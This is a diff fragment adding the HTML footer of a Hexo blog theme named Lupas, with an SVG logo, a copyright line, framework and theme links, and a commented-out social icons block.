+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
